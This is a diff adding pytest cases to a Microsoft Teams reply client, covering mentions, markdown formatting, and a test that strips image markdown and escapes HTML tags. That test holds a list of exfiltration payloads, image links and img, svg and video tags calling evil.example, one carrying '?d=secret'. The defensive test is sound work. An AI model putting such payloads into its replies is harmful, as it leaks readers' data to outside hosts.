@@ -8,6 +8,7 @@ from __future__ import annotations
 
 import asyncio
 import json
+import re
 import subprocess
 import sys
 from urllib.parse import parse_qs
@@ -198,6 +199,50 @@ async def test_a_mentioned_name_cant_add_markup(sdk):
     await client.aclose()
 
 
+async def test_a_name_with_an_apostrophe_is_mentioned_as_written(sdk):
+    teams = StandInTeams()
+    client = _client(sdk, StandInLogin(), teams)
+
+    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", "Done", mention=("29:x", "Seán O'Brien"))
+
+    body = json.loads(teams.requests[0].content)
+    assert body["text"] == "<at>Seán O'Brien</at> Done"
+    assert body["entities"][0]["text"] == "<at>Seán O'Brien</at>"
+    await client.aclose()
+
+
+async def test_a_reply_never_carries_an_image_a_reader_would_fetch(sdk):
+    teams = StandInTeams()
+    client = _client(sdk, StandInLogin(), teams)
+    answer = ("Chart: ![sales](https://evil.example/p?d=secret) and ![x][ref]\n"
+              "<IMG src=https://evil.example/q> <img/src=x>\n"
+              "Doubled: !![a](https://evil.example/2) !!![b](https://evil.example/3)\n"
+              "Unclosed fence: a ``` b ![c](https://evil.example/4)\n"
+              "Escaped: \\`![d](https://evil.example/5)\\`\n"
+              '<span title="`"><img src="https://evil.example/6"><span title="`">\n'
+              '<svg><image href="https://evil.example/7"/></svg> <video poster="https://evil.example/8">\n'
+              '<picture><source srcset="https://evil.example/9"></picture> <input type="image" src=x>\n'
+              "In code too: `![e](f)` and\n```\n![g](h)\n```\n"
+              "Comparisons stay: a < b, a <= b, 3<4")
+
+    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", answer)
+
+    text = json.loads(teams.requests[0].content)["text"]
+    assert "![" not in text
+    assert re.search(r"<[A-Za-z/!?]", text) is None
+    assert text == ("Chart: [sales](https://evil.example/p?d=secret) and [x][ref]\n"
+                    "&lt;IMG src=https://evil.example/q> &lt;img/src=x>\n"
+                    "Doubled: [a](https://evil.example/2) [b](https://evil.example/3)\n"
+                    "Unclosed fence: a ``` b [c](https://evil.example/4)\n"
+                    "Escaped: \\`[d](https://evil.example/5)\\`\n"
+                    '&lt;span title="`">&lt;img src="https://evil.example/6">&lt;span title="`">\n'
+                    '&lt;svg>&lt;image href="https://evil.example/7"/>&lt;/svg> &lt;video poster="https://evil.example/8">\n'
+                    '&lt;picture>&lt;source srcset="https://evil.example/9">&lt;/picture> &lt;input type="image" src=x>\n'
+                    "In code too: `[e](f)` and\n```\n[g](h)\n```\n"
+                    "Comparisons stay: a < b, a <= b, 3<4")
+    await client.aclose()
+
+
 async def test_a_reply_without_a_mention_has_no_mention_entity(sdk):
     teams = StandInTeams()
     client = _client(sdk, StandInLogin(), teams)
@@ -257,6 +302,20 @@ async def test_a_reply_with_a_stream_is_its_final_message(sdk):
     assert {"type": "streaminfo", "streamId": "s-1", "streamType": "final"} in body["entities"]
     assert any(entity["type"] == "mention" for entity in body["entities"])
     assert body["channelData"]["streamType"] == "final"
+    await client.aclose()
+
+
+@pytest.mark.parametrize("stream_id", [None, "s-1"])
+async def test_every_reply_is_extended_markdown_so_tables_and_headings_show(sdk, stream_id):
+    teams = StandInTeams()
+    client = _client(sdk, StandInLogin(), teams)
+    table = "## Sales\n\n| Region | Total |\n| --- | ---: |\n| EU | 4 |"
+
+    await client.reply(SERVICE_URL, "19:channel;messageid=42", "42", table, mention=("29:ana", "Ana"), stream_id=stream_id)
+
+    body = json.loads(teams.requests[0].content)
+    assert body["textFormat"] == "extendedmarkdown"
+    assert body["text"] == f"<at>Ana</at>\n\n{table}"
     await client.aclose()
 
 
